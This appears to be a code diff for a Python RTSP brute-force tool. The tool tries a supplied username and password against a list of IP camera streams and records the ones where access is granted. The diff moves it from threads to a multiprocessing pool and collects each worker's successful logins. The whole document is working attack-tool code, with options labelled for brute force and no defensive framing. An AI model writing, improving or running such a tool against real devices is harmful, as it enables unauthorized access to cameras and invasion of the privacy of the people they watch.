@@ -3,7 +3,7 @@
 import cv2
 from datetime import date
 from urllib.parse import quote
-from threading import Thread, Lock
+from multiprocessing import Process, Lock, Pool, cpu_count
 from optparse import OptionParser
 from colorama import Fore, Back, Style
 from time import strftime, localtime, sleep, time
@@ -27,10 +27,8 @@ def get_arguments(*args):
 
 lock = Lock()
 
-threads = 100
-verbose = False
-
-successful_logins = []
+threads_number = cpu_count()
+verbose = True
 
 def loginRTSP(ip, user, password):
     try:
@@ -45,22 +43,22 @@ def loginRTSP(ip, user, password):
     except:
         return False
 def loginHandler(ips, user, password, verbose=False):
-    global successful_logins
+    group_successful_logins = []
     for ip in ips:
         login_status = loginRTSP(ip, user, password)
         if login_status:
             with lock:
-                successful_logins.append(ip)
+                group_successful_logins.append(ip)
                 if verbose:
-                    display('+', f"{Back.MAGENTA}{ip}{Back.RESET} => Access Granted\t\tAccess Gained = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
+                    display('+', f"{Back.MAGENTA}{ip}{Back.RESET} => Access Granted")
                 else:
-                    display('-', f"{Back.MAGENTA}{ip}{Back.RESET} => Access Denied")
+                    print(f"{Back.RESET}", end='')
+    return group_successful_logins
 
 if __name__ == "__main__":
     arguments = get_arguments(('-i', "--ip", "ip", "File Name of List of IP Addresses (Seperated by ',')"),
                               ('-u', "--user", "user", "Username for Brute Force"),
                               ('-p', "--password", "password", "Password For Brute Force"),
-                              ('-t', "--threads", "threads", f"Number of Threads for Brute Force (Default={threads})"),
                               ('-v', "--verbose", "verbose", f"Dislay Additional Information (True/False, Default={verbose})"),
                               ('-w', "--write", "write", "Name of the File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
     if not arguments.ip:
@@ -78,10 +76,8 @@ if __name__ == "__main__":
         arguments.password = ''
     else:
         arguments.password = quote(arguments.password)
-    if not arguments.threads:
-        arguments.threads = threads
-    else:
-        arguments.threads = int(arguments.threads)
+    arguments.threads = threads_number
+    pool = Pool(arguments.threads)
     if arguments.verbose == "True":
         arguments.verbose = True
     else:
@@ -109,11 +105,13 @@ if __name__ == "__main__":
     t1 = time()
     threads = []
     for thread_index, ip_group in enumerate(ip_division):
-        threads.append(Thread(name=f"rtsp_brute_force_thread_{thread_index}", target=loginHandler, args=(ip_group, arguments.user, arguments.password, arguments.verbose,)))
-        threads[-1].start()
-    display(':', f"Started All {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads")
+        threads.append(pool.apply_async(loginHandler, (ip_group, arguments.user, arguments.password, arguments.verbose,)))
+    successful_logins = []
     for thread in threads:
-        thread.join()
+        successful_logins.extend(thread.get())
+    display(':', f"Started All {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads")
+    pool.close()
+    pool.join()
     t2 = time()
     display('+', f"All {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads Completed Execution")
     display(':', f"\tTotal IP Addresses       = {Back.MAGENTA}{total_ips}{Back.RESET}")
